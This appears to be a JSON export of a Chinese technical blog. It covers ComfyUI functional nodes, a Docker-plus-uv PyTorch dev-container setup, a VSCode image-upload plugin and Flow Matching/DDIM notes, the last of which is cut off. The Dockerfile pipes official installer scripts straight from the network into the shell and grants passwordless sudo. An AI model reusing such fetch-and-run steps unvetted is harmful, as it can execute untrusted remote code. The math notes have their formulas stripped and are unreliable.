提示需要在循环体中对多个变量应用迭代？请考虑将多个变量打包成一个 LIST，然后在循环体中使用 LIST 的解包功能来访问各个变量。 实现更多的高阶函数编写一点 Python 代码以实现更多高阶函数非常容易！ComfyUI-Functional 节点包使用 Python 协程来实现多次函数调用。请看 NestWhile 节点的实现：12345678910111213141516171819202122232425class NestWhile(CoroutineNodeBase): @classmethod def INPUT_TYPES(cls): return { \"required\": { \"function\": (\"CLOSURE\",), \"x\": (AnyType(\"*\"), ), \"predicate\": (\"CLOSURE\",), \"max_depth\": (\"INT\", {\"default\": 10, \"min\": 1, \"max\": 100}), }, \"hidden\": { \"unique_id\": \"UNIQUE_ID\" } } CATEGORY = \"duanyll/functional/high_order\" RETURN_TYPES = (AnyType(\"*\"), ) def run_coroutine(self, function, x, predicate, max_depth): for _ in range(max_depth): should_continue = yield (predicate, [x]) if not should_continue: break x = yield (function, [x]) return xNestWhile 节点继承自 CoroutineNodeBase，并实现了 run_coroutine 方法。这个方法是一个 Python 协程，使用 yield 语句来多次调用传入的函数。 利用副作用 在函数式编程中，函数通常不应该有副作用，即不应该修改外部状态或依赖于外部状态。然而 ComfyUI-Functional 节点包提供了一些节点，允许你在函数中使用副作用，轻松地实现一些功能。 Sow 和 Reap 节点允许你在函数中收集数据。Sow 节点将数据添加到一个隐含的列表中，而 Reap 节点则返回这个列表。这样你就可以在函数中动态地收集数据，而不需要显式地传递和返回它们。 使用 Sow 和 Reap 在循环中收集数据 提示为了保证在反复运行同一个工作流时得到完整的结果，运行带有副作用的工作流时，将会按需要禁用 ComfyUI 的缓存功能，这意味着可能会进行重复的计算，从而增加运行时间。 对于带有副作用的节点来说，节点之间执行的先后顺序会影响结果。为了控制执行顺序，本节点包提供的有副作用的节点都具有一个 signal 输入端口和对应的输出端口，节点会原封不动地传递这个值。为了确保副作用节点在某个节点之后执行，将这个节点的输出连接到副作用节点的 signal 输入端口；为了使副作用节点在某个节点之前执行，将 signal 串联到这个节点的输入连接上。 调试函数 本节点包约定：所有依赖于 Function Parameter 的节点（作为函数体的一部分），其输出都应该最终被 Function End 节点连接。如果有输出节点直接依赖于函数参数，就会导致错误（ComfyUI 默认对所有的输出节点求值，这样就会导致函数体在定义时就被执行）。那么如何观察函数体里的中间结果输出？本节点包提供了 Inspect 节点，可以用来在函数运行的过程中观察中间结果。 使用 Inspect 节点动态观察函数内的值 Inspect 节点有一个 signal 输入输出端口，可以用来控制它的执行顺序。Inspect 节点的第二组 value 输入输出端口用来连接待观察的值。使用时，将一个输出节点 直接 （不经过其他节点）连接到 Inspect 的第二个输出端口，就可以在函数运行时动态观察这个值，而不强制执行函数体。 如果函数运行太快，导致结果一闪而过，可以在 Inspect 节点前面或后面增加一个 Sleep 节点来延长观察时间。 提示Inspect 节点实际的行为是只有它的输出 signal 被依赖时，才触发 value 绑定的输出节点。因此在使用时确保它的 signal 在恰当的位置被连接。即使不在函数体中，Inspect 节点也非常有用。在 If/Else 的分支中，使用 Inspect 节点可以防止强制对某个分支求值，只有在分支被选中时才会更新结果。","tags":["图论","指北","comfyui"],"categories":["技术"]},{"title":"Docker 和 uv 炼丹实践指北","path":"/2025/9/1/Docker-Uv/","content":"Abstract 前作 详细介绍了如何（在 WSL2 中）中安装 CUDA 和 Docker，并且配置了 GPU 支持的 Docker 镜像。本文将更详细地介绍一种在容器中使用 uv 管理 PyTorch 深度学习环境的实践。 Introduction 为什么要抛弃 conda，转而使用 Docker 和 uv？ Why Docker 不留死角的环境隔离：Docker 默认隔离所有的用户态要素，声明可以共享的要素；而 conda 打包则是声明需要隔离的依赖——总是会有遗漏的 隔离任何包：Docker 可以将整个文件系统打包，包括所有依赖和配置，而 conda 只能隔离 Python 包和一些系统库 应急：实在别的更好的迁移环境办法，还可以 docker commit / save / load 一条龙（仅供应急使用，并非最佳实践） Why uv 快：比 pip 快 10 倍，比 conda 快 100 倍（虚指，但真的很快） 至少可以当 pip 用：不想学习？使用 uv pip install, 至少是一个更快的 pip 使用 pip 源：更少 Licensing 限制，更多镜像站。如果一个包只有 conda 源，它大概率有好些年没更新过了 是一个真正的包管理器：支持项目文件 pyproject.toml，支持自动维护的 Lockfile（有效保障 Python 环境的可复现性） Related Works 请优先参考官方文档 uv 官方文档 Docker compose 参考手册 devcontainers.json 参考手册 Method（配置文件和使用说明） 我们整体的思路是用 Docker 隔离 CUDA Toolkit 和系统 apt 包，以及其他系统级的包，用 uv 维护 Python 的 venv。 Dockerfile 在开发和调试中，经常需要临时的安装和卸载 Python 包，为了方便起见，减少重构和重启容器，本文的方法选择不把 uv 的 venv 打包进 Docker 镜像中，而是通过挂载的形式将其保留在主机文件系统上。由于 uv 本身具有快速创建和复现环境的能力（真的很快！），不用 Docker 处理 Python 环境其实是更方便且节约硬盘空间的。 因此在 Dockerfile 中我们不需要预先安装 PyTorch 等 Python 包，只需要从 nvidia/cuda 镜像继承，并安装一些系统级的包（如 git, vim, wget 等）即可。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# This file is used to build the development container for the project.# Use CUDA devel image without CUDNN since PyTorch brings its own CUDNNARG CUDA_VERSION=12.9.0FROM nvidia/cuda:${CUDA_VERSION}-devel-ubuntu22.04# Install common apt dependencies as root userENV DEBIAN_FRONTEND=noninteractiveENV TZ=Asia/Hong_KongARG UBUNTU_MIRROR=https://mirrors.bfsu.edu.cn/ubuntu/RUN sed -i \"s|http://archive.ubuntu.com/ubuntu/|$UBUNTU_MIRROR|g\" /etc/apt/sources.list &amp;&amp; \\ sed -i \"s|http://security.ubuntu.com/ubuntu/|$UBUNTU_MIRROR|g\" /etc/apt/sources.listRUN apt-get update -y &amp;&amp; \\ apt-get -y install --no-install-recommends curl tree wget ca-certificates unzip bzip2 xz-utils zip nano vim-tiny less jq lsb-release apt-transport-https sudo tmux ffmpeg libsm6 libxext6 libxrender-dev libssl3 git git-lfs gdb rsync aria2 &amp;&amp; \\ apt-get -y clean &amp;&amp; \\ rm -rf /var/lib/apt/lists/*# Create non-root userARG USER_NAME=devARG USER_UID=1000ARG USER_GID=1000RUN addgroup --gid ${USER_GID} ${USER_NAME} &amp;&amp; \\ adduser --disabled-password --gecos \"\" --uid ${USER_UID} --gid ${USER_GID} ${USER_NAME} &amp;&amp; \\ echo \"${USER_NAME} ALL=(ALL) NOPASSWD:ALL\" &gt; /etc/sudoers.d/${USER_NAME}USER ${USER_NAME}# Install the uv package manager for the userARG PYPI_MIRROR=https://mirrors.aliyun.com/pypi/simple/ENV PATH=\"/home/${USER_NAME}/.local/bin:${PATH}\"ENV UV_DEFAULT_INDEX=${PYPI_MIRROR}ENV UV_LINK_MODE=copyRUN curl -LsSf https://astral.sh/uv/install.sh | sh# Install starship promptRUN curl -sS https://starship.rs/install.sh | sh -s -- --yes &amp;&amp; \\ echo 'eval \"$(starship init bash)\"' &gt;&gt; /home/${USER_NAME}/.bashrc# Install cmake and ninja globally with uvRUN uv tool install cmake --no-cache &amp;&amp; \\ uv tool install ninja --no-cache# Configure runtime environmentsARG HUGGINGFACE_MIRROR=https://hf-mirror.comENV HF_ENDPOINT=${HUGGINGFACE_MIRROR}ENV HF_HUB_DISABLE_XET=1# Optional environment variables# Allow nvenc capabilities for ffmpegENV NVIDIA_DRIVER_CAPABILITIES=compute,video,utility# Disable NCCL P2P and IB to avoid issues with consumer-grade GPUs# ENV NCCL_P2P_DISABLE=1 NCCL_IB_DISABLE=1# Fine-tune the number of threads for OMP# ENV OMP_NUM_THREADS=8# Configure volumes for the userRUN mkdir -p /home/${USER_NAME}/.cache/huggingface &amp;&amp; \\ mkdir -p /home/${USER_NAME}/.cache/uv &amp;&amp; \\ mkdir -p /home/${USER_NAME}/.cache/torch/hub &amp;&amp; \\ mkdir -p /home/${USER_NAME}/local/share/uvVOLUME [\"/home/${USER_NAME}/.cache/huggingface\", \"/home/${USER_NAME}/.cache/uv\", \"/home/${USER_NAME}/.cache/torch/hub\", \"/home/${USER_NAME}/.local/share/uv\"] 这个 Dockerfile 相当适合在开发中使用。一些说明： 选用 devel 系列包含编译器的镜像，因为开发过程中容易遇到一些需要本机编译的包。 使用非 root 用户：挂载主机目录时，在容器中使用 root 用户会在主机文件系统中留下 root 权限的文件，导致在主机中使用普通用户权限无法管理。这里将容器内的用户名和 UID/GID 设置为和主机用户相同，避免权限问题。 镜像站：推荐在国内使用 北外 Ubuntu 镜像：https://mirrors.bfsu.edu.cn/ubuntu/ 阿里云 PyPI 镜像：https://mirrors.aliyun.com/pypi/simple/ Huggingface 镜像：https://hf-mirror.com Daocloud Docker 镜像（仅支持官网部分热门包，包括我们使用的 nvidia/cuda）：docker.m.daocloud.io 阿里云 PyTorch Wheels 镜像：https://mirrors.aliyun.com/pytorch-wheels/ 这里 uv 和 starship（shell prompt 工具）都使用官方 GitHub 源安装，因此构建镜像时仍然需要 访问外部网络. 可将客户端代理通过 ssh -R 转发到服务器上，设置 ~/.docker/config.json 的代理选项，无需 root. 一些 nvidia 驱动相关的环境变量如果遇到问题可以按需使用 docker-compose.yml 使用 Docker Compose 来创建 devcontainer，这样无论是否使用 VSCode 的 Remote - Containers 插件，都可以方便地通过 Docker Compose 启动开发容器。 123456789101112131415161718192021222324252627282930313233343536373839services: devcontainer: image: uv-devcontainer:cu${CUDA_VERSION:-12.9.0}-${USER_NAME:?} build: context: .devcontainer args: CUDA_VERSION: \"${CUDA_VERSION:?}\" USER_NAME: \"${USER_NAME:?}\" USER_UID: \"${USER_UID:-1000}\" USER_GID: \"${USER_GID:-1000}\" UBUNTU_MIRROR: \"${UBUNTU_MIRROR:-https://mirrors.bfsu.edu.cn/ubuntu/}\" PYPI_MIRROR: \"${PYPI_MIRROR:-https://mirrors.aliyun.com/pypi/simple/}\" HUGGINGFACE_MIRROR: \"${HUGGINGFACE_MIRROR:-https://hf-mirror.com}\" user: ${USER_NAME} cap_add: - SYS_PTRACE shm_size: ${SHM_SIZE:-32g} command: [\"tail\", \"-f\", \"/dev/null\"] working_dir: /workspace/${REPO_NAME:?} volumes: - \"/home/${USER_NAME}/.cache/huggingface/:/home/${USER_NAME}/.cache/huggingface/\" - \"/home/${USER_NAME}/.cache/uv/:/home/${USER_NAME}/.cache/uv/\" - \"/home/${USER_NAME}/.cache/torch/hub/:/home/${USER_NAME}/.cache/torch/hub/\" - \"/home/${USER_NAME}/.local/share/uv/:/home/${USER_NAME}/.local/share/uv/\" - \".:/workspace/${REPO_NAME:?}\" environment: - NVIDIA_VISIBLE_DEVICES=${NVIDIA_VISIBLE_DEVICES:-all} deploy: resources: reservations: devices: - driver: nvidia count: \"all\" capabilities: [gpu] 一些说明： Dockerfile 放置在 .devcontainer 目录内部，而 docker-compose.yml 放在工作区目录下。由于我们不需要把工作区中的代码和数据打包进镜像，使用 .devcontainer 作为构建上下文可显著提升构建速度，省去负载的 .dockerignore 文件。 这里除了挂载代码工作区目录，还挂载了用户的缓存目录，以便在不同的容器实例之间共享缓存数据（Huggingface 数据集与权重，uv 包缓存，PyTorch Hub 缓存，uv Python 可执行文件）。在启动容器前需要确保这些目录存在，否则就会被 Docker 在主机目录上以 root 权限创建，影响在主机上使用。 许多参数通过 .env 文件进行配置，方便在不同机器上使用： 12345678910111213141516171819# Devcontainer 镜像使用的 CUDA 版本。推荐与要安装的 PyTorch 的 CUDA 版本一致。CUDA_VERSION=12.9.0# 用户配置USER_NAME=duanyllUSER_UID=1001USER_GID=1001# 项目文件夹名称REPO_NAME=your-repo-name# Docker 运行时设置SHM_SIZE=48gNVIDIA_VISIBLE_DEVICES=all# 用于加速下载的镜像源设置UBUNTU_MIRROR=https://mirrors.bfsu.edu.cn/ubuntu/PYPI_MIRROR=https://mirrors.aliyun.com/pypi/simple/HUGGINGFACE_MIRROR=https://hf-mirror.com 我写了一个 setup_env.sh 脚本，放入工作区目录后运行可自动生成 .env 文件。 https://github.com/Duanyll/torch-devcontainer/blob/main/setup_env.shhttps://github.com/Duanyll/torch-devcontainer/blob/main/setup_env.sh 有了 docker-compose.yml 和 .env 文件记录启动容器的参数，启动容器的命令就很简洁： 1docker compose up -d 如果修改了 Dockerfile, 比如增加了 apt 包，则加上 --build 参数（重新）启动容器： 1docker compose up -d --build 随后可进入容器并执行命令： 1docker compose exec devcontainer bash devcontainer.json VSCode 的 Remote - Containers 插件可以帮我们创建容器并将 VSCode 连接到容器内部。我们让 .devcontainer/devcontainer.json 引用 Docker Compose 文件即可，不需要把容器的参数重复一遍： 123456789101112131415161718192021222324252627{ \"dockerComposeFile\": [\"../docker-compose.yml\", \"./docker-compose.extend.yml\"], \"service\": \"devcontainer\", \"customizations\": { \"vscode\": { \"extensions\": [ \"ms-python.python\", \"ms-vscode.cmake-tools\", \"ms-vscode.cpptools\", \"GitHub.copilot\", \"ms-vscode.hexeditor\", \"ms-toolsai.jupyter\", \"tamasfe.even-better-toml\", \"charliermarsh.ruff\", ], \"settings\": { \"C_Cpp.intelliSenseEngine\": \"default\", }, }, }, \"workspaceFolder\": \"/workspace/${localWorkspaceFolderBasename}\", \"shutdownAction\": \"none\", \"hostRequirements\": { \"gpu\": true, }, \"updateContentCommand\": \"uv sync --dev --no-install-project\",} 这里还使用了 ./docker-compose.extend.yml, 它可以是一个空的文件，你可以在里面放一些额外的（本机相关）的配置来覆盖外层 docker-compose.yml 的设置，比如挂载额外的目录，或者设置环境变量等。 要启动并进入容器，只需按下 F1, 输入并选择 Remote-Containers: Reopen in Container 即可。 pyproject.toml 忘掉 requirements.txt 和 environment.yml 吧！我们使用 pyproject.toml 来声明项目的依赖和配置，结合 uv 它还可以很好地处理需要特殊安装来源的包。我们使用下面的模板来创建一个 pyproject.toml 文件 123456789101112131415161718192021222324252627282930[project]name = \"torch-devcontainer\" # 可以改成项目的名称version = \"0.1.0\"description = \"Add your description here\"readme = \"README.md\"requires-python = \"&gt;=3.12\" # Python 版本要求dependencies = [][tool.uv.sources]torch = [ { index = \"pytorch\", marker = \"sys_platform == 'linux' or sys_platform == 'win32'\" },]torchvision = [ { index = \"pytorch\", marker = \"sys_platform == 'linux' or sys_platform == 'win32'\" },]torchaudio = [ { index = \"pytorch\", marker = \"sys_platform == 'linux' or sys_platform == 'win32'\" },]xformers = [ { index = \"pytorch\", marker = \"sys_platform == 'linux' or sys_platform == 'win32'\" },][[tool.uv.index]]url = \"https://mirrors.aliyun.com/pypi/simple/\"default = true[[tool.uv.index]]name = \"pytorch\"url = \"https://download.pytorch.org/whl/cu128\"explicit = true 关于 python 版本的设置，上面这个 pyproject.toml 文件中指定了 requires-python = \"&gt;=3.12\"，这里我们通常指定成项目能够运行的最宽泛要求。自 Python 3.13 起，CPython 引入了 Free-threaded 等重大的改进，因此目前（2025 年 9 月）还有相当一部分包尚未适配，使用 Python 3.12 的兼容性比较好。如果在 requires-python 中指定了 &gt;=3.8，但系统中存在 Python 3.10（如 ubuntu 22.04 自带的），那么 uv 很可能会直接使用这个 Python 3.10 创建虚拟环境。为了让 uv 使用一致的 Python 版本，可以在 pyproject.toml 旁边创建一个 .python-version 文件，内容为： 13.12 则会要求 uv 自动安装使用 Python 3.12 创建虚拟环境。 上面的 pyproject.toml 文件中还没有指定项目的依赖项，但已经预先声明了 PyTorch 相关的包的下载来源，因此稍后可直接安装这些包，未来反复安装卸载这些包时，也能确保使用了相同的安装源。此处仍然建议尽量使用 PyTorch 官网 Wheel 源，在 url 中设置 cuda 版本（如 cu128）。如果实在访问不畅，可以使用阿里云国内镜像源，例如 1234[[tool.uv.index]]name = \"pytorch\"url = \"https://mirrors.aliyun.com/pytorch-wheels/cu128\"explicit = true 但需要注意阿里云镜像更新较慢，可能没有最新的 PyTorch 版本。这里列出的 torch, torchvision, torchaudio, xformers 是常见的必须使用分 CUDA 版本的包。 创建好 pyproject.toml 后，就可以使用 uv 来安装包了： 1uv add torch torchvision 我们最好使用 uv add 命令而不是 pip install 或者 uv pip install 直接安装包。uv add 会把我们安装的包记录在 pyproject.toml 和 uv.lock 文件中，从而确保环境的一致性和可重现性。 如果已经有了 requirements.txt 文件，可以直接安装并写入项目文件： 1uv add -r requirements.txt 特殊包的安装方式uv 支持在 pyproject.toml 中声明特殊包的安装方式，以便在其他地方以相同的方式安装。从 Git 仓库直接安装的包，如 OpenAI CLIP, 在 tool.uv.sources 中添加1234[tool.uv.sources]clip = [ { git = \"https://github.com/openai/CLIP\", branch = \"main\" }]再运行安装命令1uv add clip一些带有预编译 torch 和 cuda 二进制的包（如 flash-attn, nunchaku, ktransformers, vllm 等等），直接从 PyPI 安装时需要从源码编译，编译往往需要数小时。可前往这些仓库的 GitHub Releases 页面查找是否预编译的 Wheel 包。一般这些包需要匹配的参数包括CUDA 版本（大版本如 11，12）Python 版本（如 3.8，3.9，3.10，可使用 .python-version 文件固定）PyTorch 版本（如 2.6，2.7）PyTorch C++11 ABI （一般从 PyTorch 官网 Wheel 源下载的 PyTorch 都不使用 C++11 ABI）找到对应 Wheel 包下载链接后，加入到 pyproject.toml 的 tool.uv.sources 中，例如12345[tool.uv.sources]flash-attn = [ { url = \"https://github.com/Dao-AILab/flash-attention/releases/download/v2.8.3/flash_attn-2.8.3+cu12torch2.8cxx11abiFALSE-cp312-cp312-linux_x86_64.whl\" }]再运行安装命令1uv add flash-attn 使用 venv 怎么使用 uv 建立的 Python 虚拟环境？uv 并不建议像传统的 conda 那样在终端中设置环境变量去激活环境，而是通过 uv 命令自动管理虚拟环境。uv 会在每次运行时自动激活对应的虚拟环境, 这样可以防止忘了激活环境或者是进入了错误的环境。 原来使用 conda 需要运行 12conda activate your-env-namepython main.py --arg1 --arg2 使用 uv 只需要 1uv run main.py --arg1 --arg2 uv 会查找项目对应的 pyproject.toml 文件，验证当前虚拟环境中的包是否满足声明，自动安装缺失的包 （卸载多余的包），在虚拟环境中调用正确的 Python 解释器执行脚本。 uv run 也可以用来执行虚拟环境中的命令行工具，比如 1uv run hf cache scan Experiment（操作流程） SOP 用上面这一套给新项目 / 现有项目配环境的流程是什么？ 配置 Docker 镜像。一般来说本文给出的 Dockerfile 和 docker-compose.yml 已经足够多数情况下使用。 在项目根目录下创建 .devcontainer 文件夹并将 这里 的 Dockerfile 复制到里面 在项目根目录下创建 docker-compose.yml 文件并将 这里 的内容复制到里面，一般来说只需要添加额外的挂载点，如数据集等 根据实际情况创建 .env 文件，设置 docker 镜像参数 (匹配容器内外 UID/GID, CUDA 版本等) 运行 docker compose build 构建容器。一台机器上只需要构建一次，不同项目可以复用这个镜像。 把 这里 的 devcontainers.json 文件复制到 .devcontainer 文件夹里面, 一般不用改动 (可选) 在 VSCode 中按 F1 搜索并选择 “Remote-Containers: Reopen in Container” 进入开发容器。得益于 uv 良好的 venv 管理，许多简单的，不需要使用 nvcc 编译的项目不需要进入容器也可直接在主机中管理。 创建 pyproject.toml 文件，首先把 这里 的起手式复制到 pyproject.toml 文件中。 创建 .python-version 文件, 写入实际需要的 Python 版本号 检查 requirements.txt 和 README.md 等文件, 查看项目是否使用了需要特殊方式安装的包, 如果有, 把它们的安装链接加入到 pyproject.toml 文件中 运行 uv venv 创建一个空的虚拟环境 (这个虚拟环境中默认不包含 pip) 使用 uv add 命令添加包, 直接 uv add -r requirements.txt 使用 uv run 命令运行 Python 代码和工具 (可选) 对于别人的项目, 在 GitHub 上创建 Fork, 把以上新增的配置文件 (包括 uv.lock) 推送到 Fork 的仓库中以便后续使用 项目结构 典型的项目结构: 123456789101112131415161718project├── .devcontainer│ ├── Dockerfile│ ├── devcontainer.json│ └── docker-compose.extend.yml├── .env├── .gitignore├── .python-version├── .vscode│ ├── extensions.json│ ├── launch.json│ └── settings.json├── LICENSE├── README.md├── docker-compose.yml├── pyproject.toml├── setup_env.sh└── uv.lock Appendix CUDA 版本兼容性 下面介绍不同场景下 CUDA 版本兼容性条件 启动 Docker 容器: 主机 CUDA 小版本取决于 nvidia 驱动, 主机不需要安装 CUDA Toolkit 消费级显卡 (RTX 3090, 4090, 4090): 容器内 CUDA 小版本不能高于主机 CUDA 小版本 (主机上 nvidia-smi 输出的 CUDA 版本). 数据中心显卡 (A100, H100): 容器内 CUDA 小版本可以高于主机 CUDA 小版本 因此不建议消费级显卡死守 535, 470 等 “LTS” 版本驱动, 应该尽可能更新驱动版本. 运行 PyTorch 和 PyTorch 生态下的预编译 Kernel: PyTorch 的 Python Wheel 自带了需要的 CUDA Runtime 依赖 只需要主机驱动版本不要差太远, 与主机和容器内安装的 CUDA Toolkit 版本无关 535 驱动 + cuda11.8 docker 镜像 + torch2.7cu128 的组合可以运行 编译 PyTorch 生态下的 Kernel: 容器必须用 devel 包含编译器的镜像, 容器 CUDA 版本与 PyTorch CUDA 版本一致 自从 PyTorch 2.5 后, 在 CUDA 11.8 上给第三方包编译 Kernel 会非常困难. PyTorch 2.5 以后要求使用 c++17, 但 nvcc 11.8 不支持 c++17. PyTorch 自身使用了复杂的编译规则来实现交叉编译, 但需要自己编译的第三方库几乎都没有做这些考虑. 在 CUDA 11.8 上多卡训练时, PyTorch 依赖的 nvidia-nccl-cu11 预编译包是基于 cu110 的, 在 cu118 上并不能正常工作. 需要使用 cu118 下重新编译的 NCCL. 在此提供一个可用的 预编译 Wheel, 可以像下面这样在 pyproject.toml 中引用: 12345678910111213141516171819[project]dependencies = [ \"nvidia-nccl-cu11&gt;=2.27.6\", \"torch&gt;=2.7.0\"][tool.uv]override-dependencies = [ \"nvidia-nccl-cu11==v2.27.6\" ][tool.uv.sources]torch = [ { index = \"pytorch\", marker = \"sys_platform == 'linux' or sys_platform == 'win32'\" },]nvidia-nccl-cu11 = { url = \"https://cdn.duanyll.com/whl/nvidia_nccl_cu11-2.27.6-py3-none-manylinux2014_x86_64.whl\" }[[tool.uv.index]]name = \"pytorch\"url = \"https://download.pytorch.org/whl/cu118\"explicit = true 使用 Jupyter 在 VSCode 中使用打开 ipynb 文件时, 可以直接选择 uv 的虚拟环境中的 Python 解释器作为内核. 建议将 ipykernel 包加入到项目依赖中: 1uv add ipykernel","tags":["炼丹","指北","docker"],"categories":["技术"]},{"title":"更好的 VSCode 粘贴上传图床插件","path":"/2025/8/29/Paste-And-Upload/","content":"https://marketplace.visualstudio.com/items?itemName=Duanyll.paste-and-uploadhttps://marketplace.visualstudio.com/items?itemName=Duanyll.paste-and-upload 简介 VSCode 已于今年初正式发布的 1.97 版本中引入了对 DocumentPaste 和 DocumentDrop API，允许插件原生地修改从剪贴板粘贴和从其他应用中拖拽内容的行为。在此之前的用于上传图床的插件如 PicGo 等都是通过绑定新的快捷键并调用操作系统的剪贴板 API 实现获取剪贴板中图像的，这个做法存在以下问题： 快捷键冲突。如果将自定义的粘贴命令绑定到 Ctrl+V 则容易与 VSCode 自带的或者其他插件的粘贴逻辑冲突。 远程和 Web 环境问题。有一些图床上传插件在连接到远程工作区时，在后端而非前端调用系统剪贴板 API，导致获取的是远程机器的剪贴板而非用户使用的剪贴板。另外，通过调用系统 API 获得剪贴板在 Web 版 VSCode 如 code-server 中根本不会工作。 为了解决这些问题，我开发了这个插件 Paste And Upload，它利用 VSCode 新的 API 实现了原生的粘贴上传功能，支持直接粘贴和拖拽图片到编辑器中上传，并且可以在远程和 Web 环境中工作。 使用说明 本插件支持将图像上传到 S3 兼容的对象存储服务或 VSCode 工作区。首次使用前，在 VSCode 设置中搜索 paste-and-upload 并填入访问 S3 兼容存储服务需要的凭据。推荐使用以下大厂的服务： 阿里云 OSS 香港区域 + CloudFlare CDN：免费 5GB 存储空间，无限出站流量，无需海外支付方式 CloudFlare R2：免费 10GB 存储空间，无限出站流量 BackBlaze B2：免费 10GB 存储空间，1GB/天出站流量 完成设置后，您可以直接在编辑器中按 Ctrl+V 或 Cmd+V 粘贴或拖拽图片进行上传。如果有多个插件同时使用新版 API 处理粘贴事件，VSCode 会显示一个下拉框供您选择。 对于 GIF 动图的处理已经特别优化，从浏览器中复制 GIF 动图时，插件会优先上传原始的 GIF 文件而非静态的 PNG 截图，可在设置中改变这个行为。 插件也支持将图像上传到 VSCode 的工作区，包括本机、远程文件系统，以及 Overleaf Workshop 等插件提供的虚拟工作区。这在使用 Overleaf 编写 TeX 文档时非常有用。 可以编辑 settings.json 来配置不同语言的粘贴图片行为, 可以自定义粘贴图片的目录和生成链接的目录： 123456789101112131415{ \"paste-and-upload.enabled\": false, // Save as ${workspaceFolder}/figures/image.png \"paste-and-upload.workspace.path\": \"figures\", // Insert \\includegraphics{image.png} (If you have \\graphicspath{figures}) \"paste-and-upload.workspace.linkBase\": \"\", \"[markdown]\": { \"paste-and-upload.enabled\": true, \"paste-and-upload.uploadDestination\": \"s3\", }, \"[latex]\": { \"paste-and-upload.enabled\": true, \"paste-and-upload.uploadDestination\": \"workspace\", },} 局限性 以下特性暂未支持，可能会在以后的版本中改进： 暂时不支持在纯前端的 VSCode Web 环境（如 vscode.dev）中使用。在 code-server 等环境中可以正常使用。 撤销粘贴和拖拽操作时，无法同步从 S3 存储中删除已上传的文件。可以按 F1 运行 Undo recent upload 命令，手动选择最近上传的文件进行删除。","tags":["vscode","指北"],"categories":["技术"]},{"title":"Flow Matching 与 DDIM 小记","path":"/2025/6/21/Flow/","content":"背景故事 2022 年 10 月左右，同期有三篇关于 Flow 模型用于图像生成的论文发表，并都被 ICLR 2023 录用： Flow Matching for Generative Modeling Learning to Generate and Transfer Data with Rectified Flow Building Normalizing Flows with Stochastic Interpolants 这三篇文章从不同角度出发得推导出了同一个生成模型，下面再整理一下三篇论文的故事讲法。 Flow Matching 背景：连续归一化流连续归一化流（Continuous Normalizing Flows, CNF）的概念最早由 Chen et al. (2018) 提出，CNF 通过求解常微分方程（ODE）来实现数据的变换。时间依赖的概率密度路径 满足 , 流的动态由时间依赖的向量场 定义：CNF 可以通过推前操作将先验分布 转换为目标分布 （理论上的结论，并不能用于采样）：同时连续性方程可用于验证向量场 是否生成满足以上性质的概率路径： CNF 可以用于建模任意的概率路径，然而此前不存在高效的方法 1来学习向量场 。Flow Matching 论文提出了条件流匹配方法（Conditional Flow Matching, CFM）实现从数据集中采样学习向量场 。首先引入 Flow Matching 损失函数，用神经网络 来回归近似向量场 ： 再来进一步考虑如何构造可从数据集中采样求得的 和 。将数据集中的样本 视作条件，那么 作为条件概率路径 的边缘分布可以通过积分得到： 类似的，向量场 可以视作条件向量场 的边缘分布，通过积分得到: 原文证明了条件向量场 确实能生成条件概率密度路径 。进一步，论文证明了条件流匹配损失函数 的梯度等价于 FM 损失函数 的梯度，故可以使用 CFM 损失函数训练 CNF 模型。此结论并未依赖于具体的条件概率路径 或条件向量场 的设计。 在图像生成模型中，一般把高斯噪声作为先验分布，即 。流映射在 条件下总是可以写成 可以证明此时的条件速度场具有唯一的形式 DDIM 的均值 和方差 可以直接带入到上式中，得到 Flow Matching 框架下的条件速度场。 论文又提出 OT 速度场的设计，使用线性插值的均值 和方差 。通过实验发现 OT 速度场训练收敛更快且 FID 更低。 Rectified Flow 背景：传输映射问题给定 上两个可以观测的分布 ，目标是寻找传输映射 将 映射到 。在生成建模中， 是未知但可观测目标分布（图像数据集），而 是简单的先验分布（如高斯分布）。还可以考虑传输建模，即 和 都是未知的可观测分布。最优传输（Optimal Transport, OT）目标希望最小化某个代价函数 ，即其中 可以是 L2 范数或则其他度量。一般的 OT 问题非常难解，在图像生成任务中也不太关心最小化代价。Rectified Flow 和 Reflow 是此背景下一种实用的近似方法。 Rectified Flow 使用一个简单的 ODE 来学习传输映射 。从 出发，沿速度场 进行演化，得到 ： 问题转换为学习速度场 。直观的想法（先前的工作）是想最小化 ODE 采样结果 的分布 和目标分布 的距离 ，如 KL 散度，但多次模拟求解 ODE 的代价太高了。发现此问题中，速度场 实际上是过参数化的：我们只关心开头和结尾的分布应当是 和 ，而中间的分布并不重要，可以人为地设置非常强的先验。简单的选择是让中间分布是开头结尾的某种线性插值，走直线路径，这样不仅能更接近 OT 目标，还能减少 ODE 的求解次数。 对源分布和目标分布中观测到的样本 和 ，定义线性插值 则 满足以下 ODE： 还不能直接用这个 ODE 作为速度场 ，因为它不是因果的， 依赖于最终状态 。论文提出 Rectify 过程来因果化速度场 。思路如下： Rectify 过程的 Rewire 特点 不同的插值轨迹 之间可能存在相交点，在同一个 处会有多个可能的 取值，因为不知道要沿哪条轨迹走。 另一方面，在 ODE 中， 必须由 唯一确定，于是不同的 轨迹是不能相交的。 于是在相交点处， 可以取值为 在所有可能的 取值上的平均值。 导致原本的直线轨迹 必须在相交点处弯曲来避免相交，并改变原分布和目标分布的映射关系。 以上 Rectify 过程更新了传输映射 ，但可证明保持了边缘分布 和 不变。训练目标为 代入线性插值轨迹得到训练目标 此训练目标就可以直接用在代码里了。 Rectify 过程将 轨迹转换为因果的 轨迹，不仅保持边缘分布不变，还可以证明对于凸的代价函数 ，传输代价不增 ReflowReflow 拉直轨迹原本 轨迹是直的，经过 Rectify 过程后 会在相交点弯曲，起不到一开始选择线性插值轨迹时，保持直线的优势。论文提出 Reflow 过程来修正这个问题，使用 Rectify 过程得到的 配对耦合重新训练速度场 并反复迭代：论文证明了对于下面的 “直线程度” 度量满足随 收敛到 0。也就是说，经过 Reflow 过程后， 轨迹会越来越接近直线。Reflow 其实就是从 OT 角度解释了先前的时间步蒸馏技巧。常见的预训练模型都没有做 Reflow 蒸馏。 Stochastic Interpolants WIP. Diffusion DDPM 和 DDIM 也有很多种推导的方法，下面摘自 苏神博客 中贝叶斯角度的推导，比较接近 DDIM 论文的推导方式。 DDPM 与 GAN 类似，DDPM 模型将生成定义为将一个随机噪声 变换成真实图像 的过程。然而，像 GAN 一样一步将噪声映射到真实图像的分布是困难的，因此 DDPM 考虑逐步地将噪声 变换为真实图像。首先定义一个前向过程，即将真实图像样本 逐步添加噪声，直到完全成为高斯噪声，则生成图像的过程即为将噪声 